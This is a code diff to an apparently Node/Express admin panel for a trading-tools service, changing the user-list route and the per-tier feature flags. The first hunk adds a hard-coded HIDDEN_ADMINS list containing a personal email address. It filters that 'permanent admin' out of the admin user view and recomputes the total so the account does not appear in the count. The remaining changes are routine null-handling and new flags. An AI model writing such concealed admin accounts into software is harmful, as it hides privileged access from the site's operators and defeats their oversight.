@@ -370,16 +370,19 @@ function start() {
             users = result.users || [];
             totalUsers = result.total || 0;
         } catch(e) { console.error('Admin users error:', e.message); }
+        // Filter out protected permanent admin from list
+        const HIDDEN_ADMINS = ['cdilrukshi52@gmail.com'];
+        const visibleUsers = users.filter(u => !HIDDEN_ADMINS.includes(u.email));
         res.send(renderView('admin/users', {
-            totalUsers,
-            users: users.map(u => ({
+            totalUsers: visibleUsers.length,
+            users: visibleUsers.map(u => ({
                 id:          u._id.toString(),
                 username:    u.username,
                 email:       u.email,
-                role:        u.role,
-                status:      u.accountStatus,
+                role:        u.role || 'user',
+                status:      u.accountStatus || 'active',
                 tier:        u.tier || 'free',
-                createdAt:   new Date(u.createdAt).toLocaleDateString(),
+                createdAt:   u.createdAt ? new Date(u.createdAt).toLocaleDateString() : '—',
                 lastLoginAt: u.lastLoginAt ? new Date(u.lastLoginAt).toLocaleDateString() : 'Never',
                 loginCount:  u.loginCount || 0,
             })),
@@ -555,19 +558,24 @@ function start() {
 
     // ── Feature flags ────────────────────────────────────────────
     // Global feature on/off per tier: stored in memory + config
+    // Init feature flags immediately
     if (!global._featureFlags) {
         global._featureFlags = {
-            free:  { scanner:true, paper:true, alerts:true, watchlist:true, news:true,
-                     calc:true, stats:true, ai:false, backtest:false, heatmap:true,
-                     compare:false, portfolio:false, journal:false, grid:false, funding:true },
-            vip:   { scanner:true, paper:true, alerts:true, watchlist:true, news:true,
-                     calc:true, stats:true, ai:true, backtest:true, heatmap:true,
-                     compare:true, portfolio:true, journal:true, grid:true, funding:true },
+            free: { scanner:true,  paper:true,  alerts:true,  watchlist:true,  news:true,
+                    calc:true,     stats:true,   ai:false,     backtest:false,  heatmap:true,
+                    compare:false, portfolio:false, journal:false, grid:false,  funding:true,
+                    trades:true,   tracks:true },
+            vip:  { scanner:true,  paper:true,  alerts:true,  watchlist:true,  news:true,
+                    calc:true,     stats:true,   ai:true,      backtest:true,   heatmap:true,
+                    compare:true,  portfolio:true, journal:true, grid:true,     funding:true,
+                    trades:true,   tracks:true },
         };
     }
 
     app.get('/admin/api/features', requireAdminAuth, (req, res) => {
-        res.json({ok:true, flags: global._featureFlags});
+        try {
+            res.json({ok:true, flags: global._featureFlags});
+        } catch(e) { res.status(500).json({ok:false, error:e.message}); }
     });
 
     app.post('/admin/api/features/:tier/:feature', requireAdminAuth, (req, res) => {
